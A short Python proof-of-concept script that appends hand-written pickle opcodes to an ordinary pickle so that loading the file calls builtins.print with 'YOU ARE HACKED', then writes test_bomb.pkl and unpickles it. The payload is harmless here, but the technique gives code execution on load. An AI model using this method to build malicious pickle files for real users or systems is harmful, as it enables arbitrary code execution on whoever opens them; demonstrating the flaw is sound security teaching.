import pickle
import pickletools

payload = pickle.dumps(["aaa", 111])
payload = pickletools.optimize(payload)

bomb = b"c" + b"builtins\nprint\n" + \
       b"(V" + b"YOU ARE HACKED\n" + b"tR0"
payload = payload[:-1] + bomb + b"."


# write to file our data
with open(f"test_bomb.pkl", "wb") as f:
    f.write(payload)

# unpickle bomb
with open('test_bomb.pkl', 'rb') as f:
    payload_new = f.read()
    data = pickle.loads(payload_new)

print('Read file:', data)

